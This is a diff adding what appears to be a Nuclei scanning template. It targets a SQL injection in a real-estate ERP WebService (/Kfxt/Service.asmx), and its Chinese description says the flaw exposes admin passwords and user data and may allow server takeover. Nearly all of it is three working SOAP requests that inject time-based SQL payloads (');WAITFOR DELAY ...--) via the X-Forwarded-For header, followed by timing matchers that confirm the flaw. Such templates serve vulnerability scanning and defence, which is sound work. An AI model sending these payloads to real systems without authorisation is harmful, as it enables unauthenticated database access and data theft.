@@ -1,0 +1,66 @@
+id: mydcerp-Service-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 某源地产ERP系统 WebService服务针对客户端IP权限校验时,未对X-Forwarded-For获取真实IP进行严格的过滤和校验，导致出现SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
+  reference:
+    - https://mp.weixin.qq.com/s/iUv6iV71vh_6uBLZpyJX0Q
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /Kfxt/Service.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 415
+        X-Forwarded-For: 127.0.0.1');WAITFOR DELAY '0:0:3'--
+        SOAPAction: "http://www.mysoft.com.cn/queryProjects"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <queryProjects xmlns="http://www.mysoft.com.cn/">
+              <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>
+            </queryProjects>
+          </soap:Body>
+        </soap:Envelope>
+      - |-
+        POST /Kfxt/Service.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 415
+        X-Forwarded-For: 127.0.0.1');WAITFOR DELAY '0:0:6'--
+        SOAPAction: "http://www.mysoft.com.cn/queryProjects"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <queryProjects xmlns="http://www.mysoft.com.cn/">
+              <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>
+            </queryProjects>
+          </soap:Body>
+        </soap:Envelope>
+      - |-
+        POST /Kfxt/Service.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 415
+        X-Forwarded-For: 127.0.0.1');WAITFOR DELAY '0:0:9'--
+        SOAPAction: "http://www.mysoft.com.cn/queryProjects"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <queryProjects xmlns="http://www.mysoft.com.cn/">
+              <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>
+            </queryProjects>
+          </soap:Body>
+        </soap:Envelope>
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
